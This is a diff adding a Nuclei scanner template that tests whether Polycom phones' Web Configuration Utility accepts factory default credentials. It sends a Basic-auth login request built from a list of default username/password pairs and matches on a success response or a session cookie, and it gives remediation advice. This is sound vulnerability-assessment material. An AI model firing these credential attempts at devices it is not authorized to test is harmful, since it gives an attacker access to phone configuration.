@@ -1,0 +1,53 @@
+id: polycom-web-config-utility-default-login
+
+info:
+  name: Polycom Web Configuration Utility - Default Login
+  author: mr-pmillz
+  severity: high
+  description: |
+    Polycom phone Web Configuration Utility accepts default administrator or user credentials when the factory passwords have not been changed.
+    This template checks the authentication form for a login success response or a session cookie.
+  impact: |
+    An attacker can access phone configuration with the permissions of the compromised administrator or user account.
+  remediation: |
+    Change both administrator and user passwords, and restrict access to the Web Configuration Utility to trusted management hosts.
+  reference:
+    - https://support.ringcentral.com/article-v2/Default-Username-Password-Polycom-Phones.html
+    - https://h30434.www3.hp.com/t5/Poly-Phones-Knowledge-Base/FAQ-What-is-the-warning-indication-triangle-exclamation-mark/ta-p/9510744
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    vendor: polycom
+    product: uc_software
+  tags: default-login,polycom,voip,intrusive
+
+http:
+  - raw:
+      - |
+        POST /form-submit/auth.htm HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Authorization: Basic {{base64(username + ':' + password)}}
+    payloads:
+      username:
+        - Polycom
+        - Admin
+        - User
+        - User
+      password:
+        - "456"
+        - "456"
+        - "123"
+        - ""
+    attack: pitchfork
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'lockparams|SUCCESS|0'
+        condition: or
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: session=[A-Za-z0-9-]+"
